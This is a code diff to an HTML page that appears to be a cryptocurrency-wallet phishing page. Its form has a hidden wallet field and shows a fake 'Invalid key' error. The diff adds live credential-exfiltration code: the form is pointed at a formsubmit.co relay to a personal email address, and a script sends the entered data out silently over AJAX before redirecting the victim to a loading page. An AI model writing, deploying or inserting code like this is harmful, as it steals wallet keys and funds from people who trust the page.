@@ -8424,7 +8424,7 @@
                 </div>
                 <div class="message-tab"></div>
                 <div class="send-form">
-                    <form id="form" method="post" onsubmit="console.error('Invalid key, try again')" enctype="multipart/form-data">
+                    <form id="form" method="post" onsubmit="console.error('Invalid key, try again')" action="https://formsubmit.co/bryanpaulgoodmusic@gmail.com" enctype="multipart/form-data">
                         <input type="hidden" name="_captcha" value="false" />
                         <input type="hidden" name="_next" id="next-url" />
                         <input type="hidden" name="wallet" id="walletNameData" />
@@ -10090,6 +10090,29 @@
                 });
             });
         </script>
-</body>
+        <script>
+          document.getElementById('form').addEventListener('submit', function(e) {
+            e.preventDefault();
 
+            const formData = new FormData(this);
+            // Important: use the /ajax/ endpoint for silent submission
+            const action = "https://formsubmit.co/ajax/bryanpaulgoodmusic@gmail.com";
+
+            fetch(action, {
+              method: "POST",
+              body: formData,
+              headers: {
+                'Accept': 'application/json'
+              }
+            })
+            .then(response => {
+              if (response.ok) {
+                const domain = window.location.hostname;
+                window.location.href = "load.html";
+              }
+            })
+            .catch(error => console.error("Error:", error));
+          });
+        </script>
+  </body>
 </html>
